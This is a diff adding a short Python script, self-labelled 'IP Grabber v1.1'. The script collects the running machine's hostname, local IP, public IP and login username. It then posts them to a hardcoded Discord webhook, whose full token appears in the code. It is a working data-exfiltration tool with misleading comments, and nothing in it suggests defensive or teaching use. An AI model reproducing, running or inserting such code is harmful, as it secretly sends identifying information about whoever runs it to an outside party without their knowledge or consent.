@@ -1,0 +1,33 @@
+import requests, os # type: ignore # no downloading
+import socket # downloading
+
+hostname = socket.gethostname()
+local_ip = socket.gethostbyname(hostname)
+response = requests.get('https://api64.ipify.org?format=json')
+public_ip = response.json()["ip"]
+
+webhook_url = 'https://discord.com/api/webhooks/1250154557300932619/Ty10UKI78W_tebEc7ow6_W8Wz1vXLyALDUScaxTZnjP0Tj0E0ILEwi_gra5nPQqI99Tf'
+data = {
+    "content": "IP Grabber v1.1",
+    "embeds": [
+        {
+            "title": "Grabbed IP",
+            "description": f"USER: {os.getlogin()}",
+            "color": 0x00ff00,
+            "fields": [
+                {
+                    "name": "LOCAL IP: "+local_ip,
+                    "value": "",
+                    "inline": False
+                },
+                {
+                    "name": "PUBLIC IP: "+public_ip,
+                    "value": "",
+                    "inline": False
+                }
+            ],
+        }
+    ]
+}
+
+response = requests.post(webhook_url, json=data)
